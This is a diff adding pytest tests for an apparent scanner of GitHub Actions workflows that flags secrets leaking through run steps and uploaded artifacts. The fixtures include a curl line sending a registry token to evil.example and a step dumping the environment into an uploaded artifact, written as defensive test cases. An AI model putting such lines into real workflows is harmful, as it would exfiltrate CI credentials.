@@ -446,3 +446,108 @@ jobs:
 """)
     hits = scan_target(tmp_path, [], [])
     assert [h for h in hits if h.sink_kind == "run_block"] == []
+
+
+# ---------------------------------------------------------------------------
+# --password-stdin pipe pattern — safe sink exemption
+# ---------------------------------------------------------------------------
+
+
+def test_password_stdin_pipe_suppresses_secret_in_run_body(
+    tmp_path: Path,
+) -> None:
+    """``echo "$SECRET" | docker login --password-stdin`` is the
+    recommended safe pattern — the secret never hits the process
+    argv or log. All secret refs piped through --password-stdin
+    should suppress the run_block finding."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          CR_PAT: ${{ secrets.GHCR_TOKEN }}
+        run: echo "$CR_PAT" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert run_hits == [], (
+        "password-stdin pipe pattern should be suppressed"
+    )
+
+
+def test_password_stdin_does_not_suppress_when_other_refs_remain(
+    tmp_path: Path,
+) -> None:
+    """If the body has a --password-stdin line but ALSO uses the
+    secret in a non-piped context, the finding must still fire."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          CR_PAT: ${{ secrets.GHCR_TOKEN }}
+        run: |
+          echo "$CR_PAT" | docker login ghcr.io --password-stdin
+          curl https://evil.example/?t=$CR_PAT
+""")
+    hits = scan_target(tmp_path, [], [])
+    run_hits = [h for h in hits if h.sink_kind == "run_block"]
+    assert len(run_hits) >= 1, (
+        "non-piped secret ref must still fire"
+    )
+
+
+# ---------------------------------------------------------------------------
+# GITHUB_TOKEN-only upload-artifact exemption
+# ---------------------------------------------------------------------------
+
+
+def test_upload_artifact_github_token_only_no_finding(
+    tmp_path: Path,
+) -> None:
+    """When the ONLY secret-bound env var is GITHUB_TOKEN (ephemeral,
+    auto-scoped) and it hasn't been written to disk, upload-artifact
+    should not fire — the artifact contents are safe."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - run: echo "build output" > /tmp/out.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: /tmp/out.txt
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert not any(h.sink_kind == "upload_artifact" for h in hits)
+
+
+def test_upload_artifact_real_secret_still_fires(
+    tmp_path: Path,
+) -> None:
+    """When a REAL secret (not just GITHUB_TOKEN) is bound, the
+    upload-artifact finding must still fire."""
+    _write_wf(tmp_path, "wf.yml", """\
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - run: env > /tmp/snapshot
+      - uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: /tmp/snapshot
+""")
+    hits = scan_target(tmp_path, [], [])
+    assert any(h.sink_kind == "upload_artifact" for h in hits)
